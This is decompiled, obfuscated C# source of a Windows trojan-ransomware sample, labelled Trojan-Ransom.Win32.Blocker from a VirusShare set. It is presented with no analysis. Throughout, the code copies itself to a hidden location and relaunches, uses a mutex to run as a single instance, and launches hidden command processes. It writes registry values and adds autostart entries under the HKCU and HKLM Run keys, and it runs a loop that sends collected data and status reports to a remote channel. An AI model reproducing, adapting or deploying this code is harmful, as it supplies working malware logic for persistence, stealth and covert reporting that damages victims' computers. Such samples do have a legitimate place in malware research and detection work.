// Decompiled with JetBrains decompiler
// Type: 
// Assembly: C, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AECD4788-48C4-479F-A68E-650A413D34DE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.hdzx-b05eaa7039890b2e3bc00b0bc2db874ad84b4753c0d19c47e9c03bc831a18253.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

public sealed class \u0006
{
  public static \u0008 \u0002;
  public string \u0003;
  public static string \u0005 = Interaction.Environ(\u0008\u2000.\u0002(1696691888)) + \u0008\u2000.\u0002(1696691901);
  public static string \u0008 = \u0008\u2000.\u0002(1696691845);
  public static string \u0006 = \u0008\u2000.\u0002(1696691862);
  public static string \u000E = \u0008\u2000.\u0002(1696691862);
  public static Mutex \u000F;
  public static bool \u0002\u2000 = true;

  public \u0006() => this.\u0003 = \u0008\u2000.\u0002(1696691939);

  public void \u0002(int _param1, string _param2, int _param3)
  {
    if (\u0006.\u0002 != null)
    {
      \u0008.\u0006 = true;
label_2:
      int num = checked (\u0006.\u0002.\u0002\u2000.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(\u0006.\u0002.\u0002\u2000[index], \u0008\u2000.\u0002(1696691880), false) == 0)
          checked { ++index; }
        else
          goto label_2;
      }
    }
    \u0008.\u0003 = _param3;
    \u0006.\u0002 = new \u0008();
    \u0008.\u0008 = this;
    \u0008.\u000F = _param2;
    \u0008.\u0006 = false;
    \u0006.\u0002.\u0002\u2000 = new string[checked (_param1 - 1 + 1)];
    \u0006.\u0002 obj;
    new Thread(new ParameterizedThreadStart(new \u0006.\u0002(obj)
    {
      \u0002 = \u0006.\u0002
    }._Lambda\u0024__2), 100).Start((object) _param3);
  }

  public void \u0002()
  {
    try
    {
      string fileName = Process.GetCurrentProcess().MainModule.FileName;
      int id = Process.GetCurrentProcess().Id;
      try
      {
        Process[] processesByName = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName);
        int index = 0;
        while (index < processesByName.Length)
        {
          Process process = processesByName[index];
          if (Operators.CompareString(process.MainModule.FileName.ToLower(), fileName.ToLower(), false) == 0 && process.Id > id)
            ProjectData.EndApp();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public void \u0003()
  {
    try
    {
      \u000F.\u0005 = Interaction.Environ(\u0008\u2000.\u0002(1696691945)) + \u0008\u2000.\u0002(1696691901);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    \u000F.\u0008 = this;
    \u000E.\u0002 = this;
    this.\u0008();
    if (Operators.CompareString(\u0006.\u0008.ToLower(), Strings.Split(Application.ExecutablePath, \u0008\u2000.\u0002(1696691901))[checked (Strings.Split(Application.ExecutablePath, \u0008\u2000.\u0002(1696691901)).Length - 1)].ToLower(), false) != 0)
    {
      \u0006.\u0008 = Strings.Split(Application.ExecutablePath, \u0008\u2000.\u0002(1696691901))[checked (Strings.Split(Application.ExecutablePath, \u0008\u2000.\u0002(1696691901)).Length - 1)];
      \u0006.\u0005 = Application.StartupPath + \u0008\u2000.\u0002(1696691901);
    }
    try
    {
      Mutex.OpenExisting(\u0006.\u000E);
      ProjectData.EndApp();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    \u0006.\u000F = new Mutex(true, \u0006.\u000E);
  }

  public void \u0005()
  {
    this.\u0002(false);
    \u000E.\u0002();
    try
    {
      Process.Start(new ProcessStartInfo()
      {
        FileName = \u0008\u2000.\u0002(1696691958),
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true,
        Arguments = \u0008\u2000.\u0002(1696691904) + Application.ExecutablePath + \u0008\u2000.\u0002(1696691928)
      });
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    ProjectData.EndApp();
  }

  public void \u0002(bool _param1)
  {
    try
    {
      ProcessStartInfo startInfo = new ProcessStartInfo();
      startInfo.FileName = \u0008\u2000.\u0002(1696691753);
      startInfo.CreateNoWindow = true;
      startInfo.WindowStyle = ProcessWindowStyle.Hidden;
      string str = !_param1 ? \u0008\u2000.\u0002(1696691812) : \u0008\u2000.\u0002(1696691769);
      startInfo.Arguments = str.Replace(\u0008\u2000.\u0002(1696691789), \u0008\u2000.\u0002(1696691797) + Application.ExecutablePath + \u0008\u2000.\u0002(1696691797)).Replace(\u0008\u2000.\u0002(1696691805), \u0008\u2000.\u0002(1696691797) + Strings.Split(Application.ExecutablePath, \u0008\u2000.\u0002(1696691901))[checked (Strings.Split(Application.ExecutablePath, \u0008\u2000.\u0002(1696691901)).Length - 1)] + \u0008\u2000.\u0002(1696691797));
      Process.Start(startInfo).WaitForExit(1000);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public void \u0008()
  {
    if (Operators.CompareString(Application.ExecutablePath.ToLower(), \u0006.\u0005.ToLower() + \u0006.\u0008.ToLower(), false) != 0)
    {
      try
      {
        File.Copy(Application.ExecutablePath, \u0006.\u0005 + \u0006.\u0008, true);
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.FileName = \u0006.\u0005 + \u0006.\u0008;
        if (\u0006.\u0002\u2000)
          startInfo.Arguments = \u0008\u2000.\u0002(1696692645) + Application.StartupPath;
        Process.Start(startInfo);
        ProjectData.EndApp();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        if (File.Exists(\u0006.\u0005 + \u0006.\u0008))
          ProjectData.EndApp();
        ProjectData.ClearProjectError();
      }
    }
    this.\u0002(true);
    try
    {
      \u0005.\u0002().Registry.SetValue(\u0008\u2000.\u0002(1696692657), \u0008\u2000.\u0002(1696692678), (object) 0, RegistryValueKind.DWord);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  [STAThread]
  public static void \u0002() => new Thread(new ThreadStart(new \u0006().\u0006)).Start();

  public void \u0006()
  {
    int num1 = 0;
    int num2 = 0;
    string[] strArray1 = Strings.Split(Interaction.Command(), \u0008\u2000.\u0002(1696691872));
    int index1 = 0;
    while (index1 < strArray1.Length)
    {
      string[] strArray2 = Strings.Split(strArray1[index1], \u0008\u2000.\u0002(1696692694));
      string Left = strArray2[0];
      if (Operators.CompareString(Left, \u0008\u2000.\u0002(1696692702), false) == 0)
      {
        try
        {
          File.Delete(strArray2[1]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else if (Operators.CompareString(Left, \u0008\u2000.\u0002(1696692036), false) == 0)
        Thread.Sleep(2000);
      checked { ++index1; }
    }
    this.\u0003();
    this.\u0002();
    new Thread(new ThreadStart(\u000F.\u0002().\u0002), 100).Start();
    this.\u0002(1, \u0008\u2000.\u0002(1696690667), 2);
    while (true)
    {
      Thread.Sleep(1000);
      if (\u000F.\u0006 && \u0006.\u0002 != null)
      {
        checked { ++num2; }
        try
        {
          if (\u0008.\u000F\u2000.Count > 0)
          {
            string[] array = \u0008.\u000F\u2000.ToArray();
            \u0008.\u000F\u2000.Clear();
            string str1 = \u0008\u2000.\u0002(1696692516);
            string[] strArray3 = array;
            int index2 = 0;
            while (index2 < strArray3.Length)
            {
              string str2 = strArray3[index2];
              str1 = str1 + \u000F.\u0003 + str2;
              checked { ++index2; }
            }
            \u000F.\u0002().\u0002(str1);
          }
          if (num2 > 6)
          {
            num2 = 0;
            \u000F.\u0002().\u0002(\u0008\u2000.\u0002(1696692531) + \u000F.\u0003 + \u0008\u2000.\u0002(1696691880) + \u000F.\u0003 + Conversions.ToString(\u0008.\u000E) + \u0008\u2000.\u0002(1696692538) + Conversions.ToString(\u0006.\u0002.\u0002.Length));
            \u000F.\u0002().\u0002(\u0008\u2000.\u0002(1696692531) + \u000F.\u0003 + \u0008\u2000.\u0002(1696691872) + \u000F.\u0003 + Conversions.ToString(\u0008.\u0005));
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      checked { ++num1; }
      if (num1 == 4)
      {
        num1 = 0;
        if (\u0006.\u0006.Length > 0)
        {
          try
          {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\u0008\u2000.\u0002(1696692482), true);
            if (Operators.ConditionalCompareObjectEqual(registryKey.GetValue(\u0006.\u0006), (object) null, false))
              registryKey.SetValue(\u0006.\u0006, (object) (\u0008\u2000.\u0002(1696691797) + Application.ExecutablePath + \u0008\u2000.\u0002(1696692598)));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(\u0008\u2000.\u0002(1696692482), true);
            if (Operators.ConditionalCompareObjectEqual(registryKey.GetValue(\u0006.\u0006), (object) null, false))
              registryKey.SetValue(\u0006.\u0006, (object) (\u0008\u2000.\u0002(1696691797) + Application.ExecutablePath + \u0008\u2000.\u0002(1696691797)));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
    }
  }

  internal sealed class \u0002
  {
    public \u0008 \u0002;

    public \u0002(\u0006.\u0002 _param1)
    {
      if (_param1 == null)
        return;
      this.\u0002 = _param1.\u0002;
    }

    [CompilerGenerated]
    [DebuggerStepThrough]
    [SpecialName]
    public void _Lambda\u0024__2(object _param1) => this.\u0002.\u0003(Conversions.ToInteger(_param1));
  }
}
